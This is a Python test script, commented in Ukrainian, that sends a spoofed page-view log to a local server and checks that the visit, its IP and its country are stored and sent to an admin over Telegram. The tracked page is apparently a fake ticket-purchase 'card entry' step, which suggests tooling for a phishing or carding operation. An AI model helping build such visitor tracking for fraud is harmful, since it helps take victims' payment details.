#!/usr/bin/env python3
"""
Тест автоматичного створення нових page_code
"""

import requests
import json
import time

def test_new_page_code():
    """Тестує автоматичне створення нових page_code"""
    
    print("🧪 Тестування автоматичного створення нових page_code...")
    
    # URL для тестування
    base_url = "http://127.0.0.1:8081"
    
    # Тестуємо з новим page_code
    new_page_code = "2-39"
    
    print(f"📝 Тестую з новим page_code: {new_page_code}")
    
    try:
        # Відправляємо запит на логування
        response = requests.post(
            f"{base_url}/api/log_activity",
            json={
                "page_code": new_page_code,
                "page_url": "/buy-tickets/loading/",
                "action_type": "page_view",
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
                "referer": "https://metanoia-gallery.com/"
            },
            headers={
                "Content-Type": "application/json",
                "X-Forwarded-For": "37.52.215.105"  # IP з України
            },
            timeout=10
        )
        
        if response.status_code == 200:
            print("✅ Логування успішне!")
            result = response.json()
            print(f"📊 Результат: {result}")
            
            # Чекаємо трохи для обробки
            print("⏳ Чекаю 3 секунди для обробки...")
            time.sleep(3)
            
            # Перевіряємо, чи створився page_code в базі
            print("🔍 Перевіряю базу даних...")
            
            import sqlite3
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            
            # Перевіряємо event_links
            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (new_page_code,))
            row = c.fetchone()
            if row:
                print(f"✅ page_code {new_page_code} створено в event_links з user_id: {row[0]}")
            else:
                print(f"❌ page_code {new_page_code} не знайдено в event_links")
            
            # Перевіряємо user_activity_logs
            c.execute('SELECT * FROM user_activity_logs WHERE page_code=? ORDER BY id DESC LIMIT 1', (new_page_code,))
            row = c.fetchone()
            if row:
                print(f"✅ Лог знайдено в user_activity_logs: ID={row[0]}")
                print(f"   page_name: {row[4]}")
                print(f"   user_country: {row[3]}")
            else:
                print(f"❌ Лог не знайдено в user_activity_logs")
            
            conn.close()
            
        else:
            print(f"❌ Помилка логування: {response.status_code}")
            print(f"📄 Відповідь: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print("❌ Не вдалося підключитися до сервера. Переконайтеся, що сервер запущений на порту 8081")
    except Exception as e:
        print(f"❌ Помилка: {e}")
    
    print(f"\n📱 Перевірте Telegram повідомлення адміну:")
    print(f"• Повідомлення має показувати 'Ввод карты' як назву сторінки")
    print(f"• page_code має бути {new_page_code}")
    print(f"• IP має бути 37.52.215.105")
    print(f"• Країна має бути UA (Україна)")

if __name__ == "__main__":
    test_new_page_code()
